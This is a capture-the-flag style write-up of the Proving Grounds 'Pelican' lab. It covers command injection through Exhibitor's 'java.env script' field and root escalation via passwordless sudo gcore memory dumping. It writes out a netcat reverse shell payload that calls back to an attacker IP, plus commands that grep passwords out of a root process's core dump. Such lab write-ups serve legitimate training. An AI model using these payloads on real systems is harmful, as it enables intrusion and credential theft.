# Pelican — Proving Grounds

> [!abstract] Summary
> The scan exposes an Exhibitor for ZooKeeper web interface on port 8080, reached through the port 8081 redirect. Command execution comes through the `java.env script` configuration field, which runs an injected shell command when Exhibitor reconfigures ZooKeeper. Privilege escalation then abuses a passwordless `sudo gcore`, dumping the memory of a root-owned process (`password-store`) to recover its password.

## Methodology

1. Enumerate the host's TCP services.
2. Follow the web redirect to the Exhibitor interface and use its configuration-injection path for initial access.
3. Enumerate sudo permissions and, if `gcore` is permitted, inspect a suitable root process dump for sensitive data.

### Web service and Exhibitor

on the browser , we go to port 8081 , it redirects us to http://192.168.143.98:8080/exhibitor/v1/ui/index.html

The redirect identifies the application route on port 8080 — the Exhibitor interface for ZooKeeper. The configuration route below uses the UI to apply a changed `java.env script` to get command execution.

https://www.exploit-db.com/exploits/48654


### Initial access: manual UI procedure

How to exploit (manual, via the web UI):

1. Navigate to the Exhibitor Web UI in a browser (`http://<target-ip>:8080`).
2. Go to the **Config** tab and turn **ON** the editing-mode switch.
3. Locate the `java.env script` field.
4. Insert a reverse shell payload wrapped in `$(...)` or backticks, for example:

```bash
$(/bin/nc -e /bin/sh <YOUR_IP> 4444 &)
```

5. Click **Commit → All At Once → OK**.
6. Start a netcat listener on your machine (`nc -lvnp 4444`) and wait (up to a minute) for the command to execute when Exhibitor re-launches/reconfigures ZooKeeper.

Once a shell lands, begin local privilege-escalation enumeration:

```
sudo -l
```


## Privilege escalation notes: `gcore`

`gcore` writes a core dump of a running process. If `sudo -l` permits `gcore`, or the binary has a root-owned SUID bit, that capability can be abused to read secrets straight out of a running root process's memory.

**Method 1 — sudo NOPASSWD abuse**

If `sudo -l` shows you can run `gcore` as root without a password:

1. Find a target process running as root (e.g. an SSH daemon or an authentication manager):

```bash
ps -ef | grep root
```

2. Generate the core dump of that process ID (`$PID`) using sudo:

```bash
sudo gcore -o /tmp/root_mem $PID
```

3. Extract sensitive strings from the generated core file to find passwords or keys:

```bash
strings /tmp/root_mem.$PID | grep -E -i "pass|password|pwd|token"
```

**Method 2 — SUID binary abuse**

If `gcore` has a misconfigured SUID bit (`-rwsr-xr-x`) owned by root:

1. Execute the dump directly as an unprivileged user:

```bash
gcore -o /tmp/suid_mem $PID
```

2. Parse the data with `strings` or a hex editor to look for session configurations, raw configuration data, or administrative credentials.

## Exhibitor configuration injection (detail)

In the UI, open **Config**, enable editing, and locate the `java.env script` field. Start a listener on the attack machine before committing the payload. Place the payload in shell command substitution, then save and apply it with **Commit → All At Once → OK**. Applying the configuration causes ZooKeeper/Exhibitor to reconfigure, which executes the injected command:

```bash
$(/bin/nc -e /bin/sh <YOUR_IP> 4444 &)
```

Listener:

```
nc -lvnp 4444
```

Replace `<YOUR_IP>` with the attacker interface reachable from the target. The reverse connection requires network reachability from target back to listener; if `/bin/nc -e` is unavailable on a particular image, use an equivalent shell payload supported by the target.

### `gcore` memory-dump path

`sudo -l` allows `/usr/bin/gcore` without a password, and root runs `/usr/bin/password-store`. Identify that process with `ps`, dump its memory with `sudo gcore <PID>`, then search the resulting core file with `strings` for password-related text — the dump holds the root password, which then allows `su root`.

The SUID route is conditional: check the binary's actual ownership and mode first. A SUID `gcore` is distinct from the sudoers permission and should not be assumed to exist.

## Lessons learned

- A redirect from a less obvious web port can expose the relevant application route on another port; follow and inspect redirects rather than treating the first response as the application itself.
- Exploit instructions need an attacker-reachable callback address and a listener started before triggering the configuration change.
- `gcore` can expose secrets held in a process's memory. Select a promising root-owned process based on its command line, then inspect only the dump output for useful strings.
- Pick the dump target from the process list by what its name implies: here `password-store` signals it holds credentials in memory.
